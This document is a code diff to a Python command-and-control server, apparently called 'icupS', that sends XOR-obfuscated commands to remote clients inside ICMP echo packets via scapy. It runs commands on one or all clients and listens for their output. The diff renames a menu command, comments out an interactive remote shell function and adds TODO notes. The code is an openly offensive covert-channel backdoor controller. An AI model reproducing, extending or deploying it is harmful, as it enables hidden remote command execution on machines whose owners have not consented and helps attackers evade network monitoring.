@@ -21,7 +21,7 @@ def print_title():
 
 def print_help():
     print("\taddclient <IP_ADDRESS>   Adds new client by IP")
-    print("\tshowclients              Show all added clients")
+    print("\tls                       Show all added clients")
     print("\tremoveclient <ID>        Removes a client by ID")
     print("\tremoveallclients         Removes all clients")
     print("\tsend <ID> <message>      Send message to client at ID")
@@ -29,7 +29,7 @@ def print_help():
     print("\tsendtoall <message>      Sends <message> to all clients")
     print("\texetoall <command>       Execute <command> on all clients")
     print("\tloadclients              Loads all clients specified in JSONFILE")
-    print("\tshell <ID>               Creates a direct line with client at ID")
+    # print("\tshell <ID>               Creates a direct line with client at ID")
     print("\tkill                     Stops server")
     print("\tssm                      Enables Super Secret Mode")                    
     print("\thelp                     Prints this")
@@ -75,7 +75,7 @@ def send_command(arguments, clients, execute):
         if clients.get(int(clienttokens[0])) != None:
             if DEVDEBUG: print(len(clienttokens[1].encode('utf-8')))
 
-            # FOR FUTURE PACKET SEGMENTATION
+            # TODO FOR PACKET SEGMENTATION
             # if len(clienttokens[1].encode('utf-8')) > 1469:
             #     piece = clienttokens[1][:1469]
             #     segment = "!!!" + piece 
@@ -97,7 +97,7 @@ def encrypt_decrypt(plaintext):
         encrypted += chr(ord(plaintext[i]) ^ ord(KEY)) 
     return encrypted
 
-# Reduced redundency in options
+# Send the command and add header
 def send_over_icmp(clientip, command, execute):
     global SuperSecretMode
     encrypted = encrypt_decrypt(command)
@@ -115,6 +115,7 @@ def send_over_icmp(clientip, command, execute):
     evil = IP(dst=clientip)/ICMP(type=8)/(clientcommand)
     send(evil)
 
+# TODO Execute on all clients
 # Send command to all clients
 def sendtoall(arguments, clients, execute):
     global SuperSecretMode
@@ -126,15 +127,16 @@ def sendtoall(arguments, clients, execute):
             if DEBUG and SuperSecretMode: print(f"[DEBUG] \"{arguments[1]}\" sent to {client} at {clients.get(client)} (Super Secretly)")
             elif DEBUG: print(f"[DEBUG] \"{arguments[1]}\" sent to {client} at {clients.get(client)}")
 
-# Place icupS into single client mode
-def shell(clients, arguments):
-    print("Type \"kill\" to exit")
-    while(True):
-        command = input(f"{clients.get(int(arguments[1]))} >> ")
-        if command == "kill":
-            break
-        send_over_icmp(clients.get(arguments[1]), command)
-        if DEBUG: print(f"[DEBUG] \"{command}\" sent to {arguments[1]} at {clients.get(int(arguments[1]))}")
+# TODO Repair or remove
+# # Place icupS into single client mode
+# def shell(clients, arguments):
+#     print("Type \"kill\" to exit")
+#     while(True):
+#         command = input(f"{clients.get(int(arguments[1]))} >> ")
+#         if command == "kill":
+#             break
+#         send_over_icmp(clients.get(arguments[1]), command)
+#         if DEBUG: print(f"[DEBUG] \"{command}\" sent to {arguments[1]} at {clients.get(int(arguments[1]))}")
 
 # Checks if an IP is valid
 def valid_IP(arguments):
@@ -160,7 +162,6 @@ def generate_targets(JSONFILE, clients, id):
     return id
 
 # TODO Parse newlines from output
-
 def listen(pkt):
     src = pkt[IP].dst 
     payload = str(pkt.payload)
@@ -205,7 +206,7 @@ def main():
                 id = addclient(clients, arguments, id)
             else:
                 print("[ERROR] Invalid IP Address")
-        elif arguments[0] == "showclients":
+        elif arguments[0] == "ls":
             showclients(clients)
         elif arguments[0] == "removeclient":
             removeclient(arguments, clients)
@@ -221,8 +222,8 @@ def main():
             sendtoall(arguments, clients, execute=False)
         elif arguments[0] == "loadclients":
             id = generate_targets(JSONFILE, clients, id)
-        elif arguments[0] == "shell":
-            shell(clients, arguments)
+        # elif arguments[0] == "shell":
+        #     shell(clients, arguments)
         elif arguments[0] == "kill":
             print_title()
             break
